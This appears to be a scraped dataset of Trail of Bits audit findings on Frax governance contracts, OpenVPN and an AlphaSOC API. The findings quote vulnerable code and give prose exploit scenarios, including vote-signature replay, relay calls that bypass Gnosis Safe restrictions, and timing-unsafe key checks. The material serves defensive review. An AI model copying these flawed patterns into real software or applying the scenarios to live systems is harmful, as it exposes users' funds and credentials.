"html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-05-fraxgov-securityreview.pdf", "body": "Although dependency scans did not uncover a direct threat to the project codebase, npm audit identied a dependency with a known vulnerability, the yaml library. Due to the sensitivity of the deployment code and its environment, it is important to ensure that dependencies are not malicious. Problems with dependencies in the JavaScript community could have a signicant eect on the project system as a whole. The output detailing the identied issue is provided below: Dependency Version ID", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: High"]}, {"title": "3. Replay protection missing in castVoteWithReasonAndParamsBySig ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-05-fraxgov-securityreview.pdf", "body": "The castVoteWithReasonAndParamsBySig function does not include a voter nonce, so transactions involving the function can be replayed by anyone. Votes can be cast through signatures by encoding the vote counts in the params argument. function castVoteWithReasonAndParamsBySig ( uint256 proposalId , uint8 support , string calldata reason, bytes memory params, uint8 v , bytes32 r , bytes32 s ) public virtual override returns ( uint256 ) { address voter = ECDSA.recover( _hashTypedDataV4( keccak256 ( abi.encode( EXTENDED_BALLOT_TYPEHASH, proposalId, support, keccak256 ( bytes (reason)), keccak256 (params) ) ) ), v, r, s ); return _castVote(proposalId, voter, support, reason, params); } Figure 3.1: The castVoteWithReasonAndParamsBySig function does not include a nonce. ( Governor.sol#L508-L535 ) The castVoteWithReasonAndParamsBySig function calls the _countVoteFractional function in the GovernorCountingFractional contract, which keeps track of partial votes. Unlike _countVoteNominal , _countVoteFractional can be called multiple times, as long as the voters total voting weight is not exceeded. Exploit Scenario Alice has 100,000 voting power. She signs a message, and a relayer calls castVoteWithReasonAndParamsBySig to vote for one yes and one abstain. Eve sees this transaction on-chain and replays it for the remainder of Alices voting power, casting votes that Alice did not intend to. Recommendations Short term, either include a voter nonce for replay protection or modify the _countVoteFractional function to require that _proposalVotersWeightCast[proposalId][account] equals 0 , which would allow votes to be cast only once. Long term, increase the test coverage to include cases of signature replay.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Medium"]}, {"title": "4. Ability to lock any users tokens using deposit_for ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-05-fraxgov-securityreview.pdf", "body": "The deposit_for function can be used to lock anyone's tokens given sucient token approvals and an existing lock. @external @nonreentrant ( 'lock' ) def deposit_for (_addr: address, _value: uint256): \"\"\" @notice Deposit `_value` tokens for `_addr` and add to the lock @dev Anyone (even a smart contract) can deposit for someone else, but cannot extend their locktime and deposit for a brand new user @param _addr User's wallet address @param _value Amount to add to user's lock \"\"\" _locked: LockedBalance = self .locked[_addr] assert _value > 0 # dev: need non-zero value assert _locked.amount > 0 , \"No existing lock found\" assert _locked.end > block.timestamp, \"Cannot add to expired lock. Withdraw\" self ._deposit_for(_addr, _value, 0 , self .locked[_addr], DEPOSIT_FOR_TYPE) Figure 4.1: The deposit_for function can be used to lock anyones tokens. ( test/veFXS.vy#L458-L474 ) The same issue is present in the veCRV contract for the CRV token, so it may be known or intentional. Exploit Scenario Alice gives unlimited FXS token approval to the veFXS contract. Alice wants to lock 1 FXS for 4 years. Bob sees that Alice has 100,000 FXS and locks all of the tokens for her. Alice is no longer able to access her 100,000 FXS. Recommendations Short term, make users aware of the issue in the existing token contract. Only present the user with exact approval limits when locking FXS.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "5. The relay function can be used to call critical safe functions ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-05-fraxgov-securityreview.pdf", "body": "The relay function of the FraxGovernorOmega contract supports arbitrary calls to arbitrary targets and can be leveraged in a proposal to call sensitive functions on the Gnosis Safe. function relay ( address target , uint256 value , bytes calldata data) external payable virtual onlyGovernance { ( bool success , bytes memory returndata) = target.call{value: value}(data); Address.verifyCallResult(success, returndata, \"Governor: relay reverted without message\" ); } Figure 5.1: The relay function inherited from Governor.sol The FraxGovernorOmega contract checks proposed transactions to ensure they do not target critical functions on the Gnosis Safe contract outside of the more restrictive FraxGovernorAlpha ow. function propose ( address [] memory targets, uint256 [] memory values, bytes [] memory calldatas, string memory description ) public override returns ( uint256 proposalId ) { _requireSenderAboveProposalThreshold(); for ( uint256 i = 0 ; i < targets.length; ++i) { address target = targets[i]; // Disallow allowlisted safes because Omega would be able to call safe.approveHash() outside of the // addTransaction() / execute() / rejectTransaction() flow if ($safeRequiredSignatures[target] != 0 ) { revert IFraxGovernorOmega.DisallowedTarget(target); } } proposalId = _propose({ targets: targets, values: values, calldatas: calldatas, description: description }); } Figure 5.2: The propose function of FraxGovernorOmega.sol A malicious user can hide a call to the Gnosis Safe by wrapping it in a call to the relay function. There are no further restrictions on the target contract argument, which means the relay function can be called with calldata that targets the Gnosis Safe contract. Exploit Scenario Alice, a veFXS holder, submits a transaction to the propose function. The targets array contains the FraxGovernorOmega address, and the corresponding calldatas array contains an encoded call to its relay function. The encoded call to the relay function has a target address of an allowlisted Gnosis Safe and an encoded call to its approveHash function with a payload of a malicious transaction hash. Due to the low quorum threshold on FraxGovernorOmega and the shorter voting period, Alice is able to push her malicious transaction through, and it is approved by the safe even though it should not have been. Recommendations Short term, add a check to the relay function that prevents it from targeting addresses of allowlisted safes. Long term, carefully examine all cases of user-provided inputs, especially where arbitrary targets and calldata can be submitted, and expand the unit tests to account for edge cases specic to the wider system.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Medium"]}, {"title": "6. Votes can be delegated to contracts ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-05-fraxgov-securityreview.pdf", "body": "Votes can be delegated to smart contracts. This behavior contrasts with the fact that FXS tokens can be locked only in whitelisted contracts. Allowing votes to be delegated to smart contracts could lead to unexpected behavior. By default, smart contracts are unable to gain voting power; to gain voting power, they need to be explicitly whitelisted by the Frax Finance team in the veFXS contract. @internal def assert_not_contract (addr: address): \"\"\" @notice Check if the call is from a whitelisted smart contract, revert if not @param addr Address to be checked \"\"\" if addr != tx.origin: checker: address = self .smart_wallet_checker if checker != ZERO_ADDRESS: if SmartWalletChecker(checker).check(addr): return raise \"Smart contract depositors not allowed\" Figure 6.1: The contract check in veFXS.vy This is the intended design of the voting escrow contract, as allowing smart contracts to vote would enable wrapped tokens and bribes. The VeFxsVotingDelegation contract enables users to delegate their voting power to other addresses, but it does not contain a check for smart contracts. This means that smart contracts can now hold voting power, and the team is unable to disallow this. function _delegate ( address delegator , address delegatee ) internal { // Revert if delegating to self with address(0), should be address(delegator) if (delegatee == address ( 0 )) revert IVeFxsVotingDelegation.IncorrectSelfDelegation(); IVeFxsVotingDelegation.Delegation memory previousDelegation = $delegations[delegator]; // This ensures that checkpoints take effect at the next epoch uint256 checkpointTimestamp = (( block.timestamp / 1 days) * 1 days) + 1 days; IVeFxsVotingDelegation.NormalizedVeFxsLockInfo memory normalizedDelegatorVeFxsLockInfo = _getNormalizedVeFxsLockInfo({ delegator: delegator, checkpointTimestamp: checkpointTimestamp }); _moveVotingPowerFromPreviousDelegate({ previousDelegation: previousDelegation, checkpointTimestamp: checkpointTimestamp }); _moveVotingPowerToNewDelegate({ newDelegate: delegatee, delegatorVeFxsLockInfo: normalizedDelegatorVeFxsLockInfo, checkpointTimestamp: checkpointTimestamp }); // ... } Figure 6.2: The _delegate function in VeFxsVotingDelegation.sol Exploit Scenario Eve sets up a contract that accepts delegated votes in exchange for rewards. The contract ends up owning a majority of the FXS voting power. Recommendations Short term, consider whether smart contracts should be allowed to hold voting power. If so, document this fact; if not, add a check to the VeFxsVotingDelegation contract to ensure that addresses receiving delegated voting power are not smart contracts . Long term, when implementing new features, consider the implications of adding them to ensure that they do not lift constraints that were placed beforehand.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "7. Lack of public documentation regarding voting power expiry ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-05-fraxgov-securityreview.pdf", "body": "The user documentation concerning the calculation of voting power is unclear. The Frax-Governance specication sheet provided by the Frax Finance team states, Voting power goes to 0 at veFXS lock expiration time, this is dierent from veFXS.getBalance() which will return the locked amount of FXS after the lock has expired. This statement is in line with the codes behavior. The _calculateVotingWeight function in the VeFxsVotingDelegation contract does not return the locked veFXS balance once a lock has expired. /// @notice The ```_calculateVotingWeight``` function calculates ```account```'s voting weight. Is 0 if they ever delegated and the delegation is in effect. /// @param voter Address of voter /// @param timestamp A block.timestamp, typically corresponding to a proposal snapshot /// @return votingWeight Voting weight corresponding to ```account```'s veFXS balance function _calculateVotingWeight ( address voter , uint256 timestamp ) internal view returns ( uint256 ) { // If lock is expired they have no voting weight if (VE_FXS.locked(voter).end <= timestamp) return 0 ; uint256 firstDelegationTimestamp = $delegations[voter].firstDelegationTimestamp; // Never delegated OR this timestamp is before the first delegation by account if (firstDelegationTimestamp == 0 || timestamp < firstDelegationTimestamp) { try VE_FXS.balanceOf({ addr: voter, _t: timestamp }) returns ( uint256 _balance ) { return _balance; } catch {} } return 0 ; } Figure 7.2: The function that calculates the voting weight in VeFxsVotingDelegation.sol If a voters lock has expired or was never created, the short-circuit condition returns zero voting power. This behavior contrasts with the veFxs.balanceOf function, which would return the users last locked FXS balance. @external @view def balanceOf (addr: address, _t: uint256 = block.timestamp) -> uint256: \"\"\" @notice Get the current voting power for `msg.sender` @dev Adheres to the ERC20 `balanceOf` interface for Aragon compatibility @param addr User wallet address @param _t Epoch time to return voting power at @return User voting power \"\"\" _epoch: uint256 = self .user_point_epoch[addr] if _epoch == 0 : return 0 else : last_point: Point = self .user_point_history[addr][_epoch] last_point.bias -= last_point.slope * convert(_t - last_point.ts, int128) if last_point.bias < 0 : last_point.bias = 0 unweighted_supply: uint256 = convert(last_point.bias, uint256) # Original from veCRV weighted_supply: uint256 = last_point.fxs_amt + (VOTE_WEIGHT_MULTIPLIER * unweighted_supply) return weighted_supply Figure 7.1: The balanceOf function in veFXS.vy This divergence should be clearly documented in the code and should be reected in Frax Finances public-facing documentation, which does not mention the fact that an expired lock does not hold any voting power: Each veFXS has 1 vote in governance proposals. Staking 1 FXS for the maximum time, 4 years, would generate 4 veFXS. This veFXS balance itself will slowly decay down to 1 veFXS after 4 years, [...]. Exploit Scenario Alice buys FXS to be able to vote on a proposal. She is not aware that she is required to create a lock (even if expired) to have any voting power at all. She is unable to vote for the proposal. Recommendations Short term, modify the VeFxsVotingDelegation contract to reect the desired voting power curve and/or document whether this is intended behavior. Long term, make sure to keep public-facing documentation up to date when changes are made.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "8. Spamming risk in propose functions ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-05-fraxgov-securityreview.pdf", "body": "Anyone with enough veFXS tokens to meet the proposal threshold can submit an unbounded number of proposals to both the FraxGovernorAlpha and FraxGovernorOmega contracts. The only requirement for submitting proposals is that the msg.sender address must have a balance of veFXS tokens larger than the _proposalThreshold value. Once that requirement is met, a user can submit as many proposals as they would like. A large volume of proposals may create diculties for o-chain monitoring solutions and user-interface interactions. function _requireSenderAboveProposalThreshold() internal view { if (_getVotes(msg.sender, block.timestamp - 1, \"\") < proposalThreshold()) { revert SenderVotingWeightBelowProposalThreshold(); } } Figure 8.1: The _requireSenderAboveProposalThreshold function, called by the propose function ( FraxGovernorBase.sol#L104-L108 ) Exploit Scenario Mallory has 100,000 voting power. She submits one million proposals with small but unique changes to the description eld of each one. The system saves one million unique proposals and emits one million ProposalCreated events. Front-end components and o-chain monitoring systems are spammed with large quantities of data. Recommendations Short term, track and limit the number of proposals a user can have active at any given time. Long term, consider cases of user interactions beyond just the intended use cases for potential malicious behavior. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "1. Broken fuzzing harnesses ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-openvpn-openvpn2-securityreview.pdf", "body": "OpenVPN fuzzing is performed through the oss-fuzz project; however, the build has been broken since November 8, 2022, and the code has not been continuously fuzzed via oss-fuzz since that time (gure 1.1). We moved the fuzzing harnesses from the oss-fuzz project to the OpenVPN repository and xed them in OpenVPN/openvpn#208. However, the oss-fuzz repository still needs to be updated in order to use the buildable fuzzing harnesses. After measuring the code coverage these harnesses achieve, some were found to cover certain paths (case 0 in a switch statement) more than others, which can slow the process of obtaining proper code coverage. For example, the fuzz_buffer harness tests the buf_clear function substantially more often than any other cases it was supposed to test (gure 1.2). This happened due to bias in the return value of the fuzz_randomizer_get_int function, which we detail in Appendix E. Figure 1.1: The OpenVPN project's oss-fuzz build status (https://oss-fuzz-build-logs.storage.googleapis.com/index.html#openvpn). Figure 1.2: A screenshot of code coverage report for the fuzz_buffer harness. The columns represent: line number, number of hits by the fuzzer's corpus inputs, and the code lines. The rst case (value 0) is hit more than 1,800 times, while the other cases are hit around tens of times. Recommendations Short term, build the updated fuzzing harnesses on the CI to ensure updates do not break their ability to build successfully. Update the OpenVPN project in the oss-fuzz repository to use the updated harnesses. Long term, establish procedures for periodically reviewing and improving the coverage of existing fuzzing harnesses.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "2. Certain error paths do not free allocated memory leading to memory leaks ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-openvpn-openvpn2-securityreview.pdf", "body": "There are three cases where resources are not freed appropriately during error handling. These resources are allocated by either argv_new or gc_new (along with operations performed on the returned gc object which triggers the actual allocation since gc_new itself does not allocate):  In the verify_user_pass_script function, the gc, argv, and tmp_file resources are not freed if the key_state_gen_auth_control_files call fails (gure 2.1). The code should jump to the done label after rst setting the retval to OPENVPN_PLUGIN_FUNC_ERROR.  In the get_console_input_systemd function, the allocation performed in argv_new will cause a memory leak due to lack of argv_free when the openvpn_popen call fails (gure 2.1).  In the set_lladdr function, if the target is neither Linux or Solaris, the argv resource will be leaked due to lack of argv_free call (gure 2.3). verify_user_pass_script(...) { struct gc_arena gc = gc_new(); struct argv argv = argv_new(); ... argv_parse_cmd(&argv, session->opt->auth_user_pass_verify_script); if (session->opt->auth_user_pass_verify_script_via_file) { struct status_output *so; tmp_file = platform_create_temp_file(session->opt->tmp_dir, \"up\", &gc); if (tmp_file) { ... argv_printf_cat(&argv, \"%s\", tmp_file); } } else { ... } /* generate filename for deferred auth control file */ if (!key_state_gen_auth_control_files(&ks->script_auth, session->opt)) { msg(D_TLS_ERRORS, \"TLS Auth Error (%s): \" \"could not create deferred auth control file\", __func__); return OPENVPN_PLUGIN_FUNC_ERROR; } ... done: if (tmp_file && strlen(tmp_file) > 0) { platform_unlink(tmp_file); } argv_free(&argv); gc_free(&gc); return retval; } Figure 2.1: openvpn/src/openvpn/ssl_verify.c#L1319-L1418 static bool get_console_input_systemd(...) { ... struct argv argv = argv_new(); ... if ((std_out = openvpn_popen(&argv, NULL)) < 0) { return false; } Figure 2.2: openvpn/src/openvpn/console_systemd.c#L63-L78 int set_lladdr(...) { #if defined(TARGET_LINUX) ... #else /* if defined(TARGET_LINUX) */ struct argv argv = argv_new(); #if defined(TARGET_SOLARIS) ... #else /* if defined(TARGET_SOLARIS) */ msg(M_WARN, \"Sorry, but I don't know how to configure link layer addresses on this operating system.\"); return -1; #endif /* if defined(TARGET_SOLARIS) */ Figure 2.3: openvpn/src/openvpn/lladdr.c#L35-L58 This issue can be found with custom static analysis queries with CodeQL or by querying the code with Weggli, as demonstrated in Appendices D.2 and D.3. Recommendations Short term, x the code paths that leak memory by calling the appropriate memory-freeing functions. In the case of the verify_user_pass_script function, set retval = OPENVPN_PLUGIN_FUNC_ERROR and jump to the done label so that all the resources are freed up before the function returns. In the other two cases, call argv_free(&argv) before the return statements. Long term, create CodeQL rules to run on your CI/CD pipeline to ensure that your team is alerted if any new potential vulnerabilities surface during development of the project. 4. Stack bu\u0000er out-of-bounds read in command line options parsing Severity: Informational Diculty: High Type: Undened Behavior Finding ID: TOB-OVPN-4 Target: src/openvpn/options.h", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "7. Support of weak proxy authentication algorithm ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-openvpn-openvpn2-securityreview.pdf", "body": "The OpenVPN code supports both the NTLMv1 and NTLMv2 proxy authentication methods. NTLM is an insecure and legacy authentication protocol that has been superseded by NTLMv2. NTLM (v1) uses cryptographically weak algorithms, such as MD4 and DES, to represent users passwords. It is also vulnerable to relay attacks. Note that other proxy authentication methods are also not safe when used through an unencrypted (HTTP) channel, as described in nding TOB-OVPN-11. However, a compromised NTLM credential can impact the other environments where it is used. Also, all currently supported versions of Windows support NTLMv2. Furthermore, although the code supports NTLMv2, the documentation pages do not mention it as a valid authentication method. bool ntlmv2_enabled = (p->auth_method == HTTP_AUTH_NTLM2); ... if (ntlmv2_enabled) else /* Generate NTLM response */ { { /* Generate NTLMv2 response */ } unsigned char key1[DES_KEY_LENGTH], key2[DES_KEY_LENGTH]; unsigned char key3[DES_KEY_LENGTH]; create_des_keys(md4_hash, key1); cipher_des_encrypt_ecb(key1, challenge, ntlm_response); create_des_keys(&md4_hash[DES_KEY_LENGTH - 1], key2); cipher_des_encrypt_ecb(key2, challenge, &ntlm_response[DES_KEY_LENGTH]); create_des_keys(&md4_hash[2 * (DES_KEY_LENGTH - 1)], key3); cipher_des_encrypt_ecb(key3, challenge, &ntlm_response[DES_KEY_LENGTH * 2]); } Figure 7.1: NTLM is considered insecure, as it relies to MD4 and DES ECB (openvpn/src/openvpn/ntlm.c#L220-L374) Recommendations Short term, deprecate the NTLMv1 proxy authentication mechanism and consider removing support for it in future OpenVPN versions. Additionally, improve the documentation to highlight the insecurity of the NTLMv1 authentication method and to advise users to use the more secure NTLMv2 method. If TLS proxy support is added, encourage users to use it as well.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Medium"]}, {"title": "8. Decoding username can silently cause truncated or empty username ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-openvpn-openvpn2-securityreview.pdf", "body": "In the get_auth_challenge function, the separate parts of the auth_challenge are decoded and veried. The user eld is encoded using Base64, and the openvpn_base64_decode function is used to decode it. The return value is not checked for success (gure 8.1). Failure to decode the work string into ac->user will silently pass. Since the ac->user eld is allocated with the \"clear\" allocation ag set, this would leave no or partially decoded content in the ac->user eld. struct auth_challenge_info * get_auth_challenge(const char *auth_challenge, struct gc_arena *gc) { ... ac->user = (char *) gc_malloc(strlen(work)+1, true, gc); openvpn_base64_decode(work, (void *)ac->user, -1); Figure 8.1: Failed Base64-decoding silently corrupts the stored username. (src/openvpn/misc.c#457458) The get_auth_challenge function is called in the get_user_pass_cr function when OpenVPN is compiled with the management interface enabled and when the username/password are provided from standard input (gure 8.2). Although this nding does not seem a direct security risk, we include it so that similar mistakes can be avoided in the future. bool get_user_pass_cr(..., const char *auth_challenge) { ... // Get username/password from standard input? if (username_from_stdin || password_from_stdin || response_from_stdin) { #ifdef ENABLE_MANAGEMENT if (auth_challenge && (flags & GET_USER_PASS_DYNAMIC_CHALLENGE) && response_from_stdin) { struct auth_challenge_info *ac = get_auth_challenge(auth_challenge, &gc); Figure 8.2: Code that calls the get_auth_challenge (src/openvpn/misc.c#L283-L291). Recommendations Short term, verify the return value of the openvpn_base64_decode function in the get_auth_challenge function and take necessary action on failure. Long term, consider marking functions that can fail with [[nodiscard]] attributea C23 featureto require handling the return value.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "11. Lack of TLS support by the HTTP and SOCKS proxy may lead to compromise of a user's proxy authentication credentials ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-openvpn-openvpn2-securityreview.pdf", "body": "OpenVPN allows clients to connect to the OpenVPN server through a HTTP and SOCKS proxies. However, it does not implement TLS for authentication to the proxy server. Without TLS, an attacker who observes or intercepts the authentication trac between a user and proxy can compromise the proxy authentication credentials, as all of the available authentication methods (Basic, Digest, and NTLM) have weaknesses. These risks are not documented by OpenVPN nor is the user warned of the same. Recommendations Short term, alert users of the risks of using unencrypted HTTP proxy authentication in the documentation. Long term, consider adding support for using HTTPS (TLS) for proxy authentication. Additionally,", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "12. Implicit conversions that lose integer precision ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-openvpn-openvpn2-securityreview.pdf", "body": "The code contains many cases where variables of the integer class are implicitly converted from one type to another in a way that risks altering the value. For example, building with clang and -Wshorten-64-to-32 ags 128 places where a 64-bit variable is passed to a function using a 32-bit type for the argument. Each such case is a potential problem if there is ever a case where the value before conversion exceeds the maximum value for the corresponding receiving type, or if the signedness is changed by the conversion. Exploit Scenario Mallory nds a place in the code where such a truncation causes a too-small memory allocation and uses this memory write primitive to corrupt application memory. Recommendations Short term, triage the conversion warnings to eliminate those where the conversion is deemed safe, and update the types used where it is not. Using CodeQL rules and value analysis can facilitate this somewhat. For example, create a rule that returns a conversion warning only if the value analysis cannot prove that the value is safe. Long term, as the codebase is updated, incrementally introduce explicit casts and, unless it is clear from the adjacent code, add a note why the cast is safe. This will help future code audits, as it makes the developers intention clear.", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: High"]}, {"title": "13. The OpenVPN build system does not enable compiler security mitigations ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-openvpn-openvpn2-securityreview.pdf", "body": "The OpenVPN build system on Linux does not explicitly enable modern compiler security mitigations, which may cause users to use less secure congurations if they build the OpenVPN binaries themselves without extra caution. This would make it easier for an attacker who nds a low-level vulnerability to exploit a bug and gain control over the process. Modern compilers support exploit mitigations including the following:  NX (non-executable data)  PIE (a position-independent executable, which is position-independent code for address space layout randomization (ASLR))  Stack canaries (for buer overow detection)  RELRO (for data section hardening)  Source fortication (for buer overow detection and format string protection)  Stack clash protection (for the detection of clashes between a stack pointer and another memory region)  CFI (control ow integrity)  SafeStack (for stack overow protection) For details on these exploit mitigation technologies, see Appendix F: Compiler Mitigations. The severity of this nding is undetermined as compilers and package maintainers enable some of these mitigations by default, and we have not investigated if this issue actually concerns OpenVPN users; it is possible that it does. Additionally, we have not reviewed the security hardening ags on MacOS or Windows, and we recommend doing this for OpenVPN clients on those platforms. Recommendations Short term, enable security mitigations for OpenVPN binaries using the compiler and linker ags described in Appendix F: Compiler Mitigations. Although compilers often enable certain mitigations by default, explicitly enabling them will ensure that they will be used regardless of a compilers defaults. Long term, enable security mitigations for all OpenVPN binaries and add a scan for them with checksec.rs or BinSkim Binary Analyzer into the CI/CD pipeline to ensure that certain options are always enabled. This will make it more dicult for an attacker to exploit any bugs found in the binaries. For additional assurance, consider verifying whether the ASLR system-wide setting is enabled during startup by checking the value stored in the /proc/sys/kernel/randomize_va_space le; if the value is below 2, designate it for future investigation. Also track the development of the Linux kernel conguration aimed at making the randomize_va_space setting read-only; update the kernel and use that option when it becomes available. We also recommend reviewing possible security hardening options on Windows and MacOS builds. References  \"Getting the maximum of your C compiler, for security\"  Debian hardening recommendations  GCC man page  LD man page (see -z keywords)", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: High"]}, {"title": "14. The ntlm_phase_3 function does not verify if it received the correct length of the challenge data ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-openvpn-openvpn2-securityreview.pdf", "body": "The ntlm_phase_3 function decodes a Base64 payload into the buf2 buer, from which the NTLM challenge bytes are then extracted (gure 14.1). However, the code does not verify that the decoded data is big enough to include the challenge bytes. As a result, if the decoded Base64 data is shorter than expected, the code will copy the previous data stored in the buf2 buer (which are all zeroes due to the CLEAR(buf2) call beforehand). The severity of this nding is informational since the buf2 buer is cleared before it is copied from. If that were not the case, the challenge extraction would copy uninitialized data and could leak sensitive information such as memory addresses to the proxy server this code talks to. const char* ntlm_phase_3(/* (...) */) { // (...) uint8_t buf2[128]; /* decoded reply from proxy */ // (...) CLEAR(buf2); // (...) ret_val = openvpn_base64_decode(phase_2, buf2, -1); if (ret_val < 0) { // no check for the size of data decoded in buf2 return NULL; } /* we can be sure that phase_2 is less than 128 * therefore buf2 needs to be (3/4 * 128) */ /* extract the challenge from bytes 24-31 */ for (i = 0; i<8; i++) { challenge[i] = buf2[i+24]; } Figure 14.1: openvpn/src/openvpn/ntlm.c#L256-L269 Recommendations Short term, change the ntlm_phase_3 code to verify that the length of the decoded buer matches the expected length of the challenge data, which is eight bytes. The length of the decoded buer is the result of the openvpn_base64_decode call and so is stored in the ret_val variable (if the decoding succeeds and does not return -1). Long term, create unit tests to test unhappy paths which contain truncated HTTP request/response data. This will help to prevent similar issues in the future.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "15. The establish_http_proxy_passthru function proxy-authenticate header check is insu\u0000cient ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-openvpn-openvpn2-securityreview.pdf", "body": "The establish_http_proxy_passthru function's parsing of the \"Proxy-Authenticate: NTLM \" header is incorrect. Instead of matching the exact header name, the function reads the request lines until it nds a line that matches the \"%*s NTLM %128s\" format. This may result in processing an incorrect header that would contain the \"NTLM\" string as the \"Proxy-Authenticate\" header. Additionally, the function does not take into account a possible case where the Proxy-Authenticate header is duplicated. In such a case, the code will use the rst header, while maybe it should not process such a request. The severity of this nding is undetermined as we haven't fully analyzed the impact of this issue due to time constraints. bool establish_http_proxy_passthru(/* (...) */) { // (...) /* look for the phase 2 response */ while (true) { if (!recv_line(sd, buf, sizeof(buf), /* (...) */)) { goto error; } chomp(buf); msg(D_PROXY, \"HTTP proxy returned: '%s'\", buf); openvpn_snprintf(get, sizeof get, \"%%*s NTLM %%%ds\", (int) sizeof(buf2) - 1); nparms = sscanf(buf, get, buf2); buf2[128] = 0; /* we only need the beginning - ensure it's null terminated. */ /* check for \"Proxy-Authenticate: NTLM TlRM...\" */ if (nparms == 1){ /* parse buf2 */ msg(D_PROXY, \"auth string: '%s'\", buf2); break; } } Figure 15.1: openvpn/src/openvpn/proxy.c#L759-L781 Recommendations Short term, investigate this issue and x it. Consider changing the establish_http_proxy_passthru function to: 1) process the NTLM data only in case the correct Proxy-Authenticate header is received and 2) to account for the situation when this header may be duplicated, in which case the function should probably reject such a request.", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: High"]}, {"title": "1. API keys are leaked outside of the application server ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-alphasoc-alphasocapi-securityreview.pdf", "body": "API key verication is handled by the AuthKey function (gure 1.1). This function uses the auth method, which passes the plaintext value of a key to the database (as part of the database query), as shown in gure 1.2. func (s *CustomerStore) AuthKey(ctx context.Context, key string) (*clap.User, error) { internalUser, err := s.authInternalKey(ctx, key) if err == store.ErrInvalidAPIKey { return s.auth(ctx, \"auth_api_key\", key) } else if err != nil { return nil, err } return internalUser, nil } Figure 1.1: The call to the auth method (clap/internal/dbstore/customer.go#L73L82) func (s *CustomerStore) auth(ctx context.Context, funName string, value interface{}) (*clap.User, error) { user := &clap.User{ Type: clap.UserTypeCustomer, } err := s.db.QueryRowContext(ctx, fmt.Sprintf(` SELECT ws.sid, ws.workspace_id, ws.credential_id FROM console_clap.%s($1) AS ws LEFT JOIN api.disabled_user AS du ON du.user_id = ws.sid WHERE du.user_id IS NULL LIMIT 1 `, pq.QuoteIdentifier(funName)), value).Scan(&user.ID, &user.WorkspaceID, &user.CredentialID) ... } Figure 1.2: The database query, with an embedded plaintext key (clap/internal/dbstore/customer.go#L117L141) Moreover, keys are generated in the database (gure 1.3) rather than in the Go code and are then sent back to the API, which increases their exposure. gk := &store.GeneratedKey{} err = tx.QueryRowContext(ctx, ` SELECT sid, key FROM console_clap.key_request() `).Scan(&gk.CustomerID, &gk.Key) Figure 1.3: clap/internal/dbstore/customer.go#L50L53 Exploit Scenario An attacker gains access to connection trac between the application server and the database, steals the API keys being transmitted, and uses them to impersonate their owners. Recommendations Short term, have the API hash keys before sending them to the database, and generate API keys in the Go code. This will reduce the keys exposure. Long term, document the trust boundaries traversed by sensitive data.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "2. Unused insecure authentication mechanism ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-alphasoc-alphasocapi-securityreview.pdf", "body": "The clap code contains an unused insecure authentication mechanism, the FixedKeyAuther strategy, that stores congured plaintext keys (gure 2.1) and veries them through a non-constant-time comparison (gure 2.2). The use of this comparison creates a timing attack risk. /* if cfg.Server.SickMode { if cfg.Server.ApiKey == \"\" { config\") log15.Crit(\"In sick mode, api key variable must be set in os.Exit(1) } auther = FixedKeyAuther{ ID: -1, Key: cfg.Server.ApiKey, } } else*/ Figure 2.1: clap/server/server.go#L57L67 type FixedKeyAuther struct { Key string ID int64 } func (a FixedKeyAuther) AuthKey(ctx context.Context, key string) (*clap.User, error) { if key != \"\" && key == a.Key { return &clap.User{ID: a.ID}, nil } return nil, nil } Figure 2.2: clap/server/auth.go#L19L29 Exploit Scenario The FixedKeyAuther strategy is enabled. This increases the risk of a key leak, since the authentication mechanism is vulnerable to timing attacks and stores plaintext API keys in memory. Recommendations Short term, to prevent API key exposure, either remove the FixedKeyAuther strategy or change it so that it uses a hash of the API key. Long term, avoid leaving commented-out or unused code in the codebase.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "3. Use of panics to handle user-triggerable errors ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-alphasoc-alphasocapi-securityreview.pdf", "body": "The clap HTTP handler mechanism uses panic to handle errors that can be triggered by users (gures 3.1 and 3.2). Handling these unusual cases of panics requires the mechanism to lter out errors of the RequestError type (gure 3.3). The use of panics to handle expected errors alters the panic semantics, deviates from callers expectations, and makes reasoning about the code and its error handling more dicult. func (r *Request) MustUnmarshal(v interface{}) { 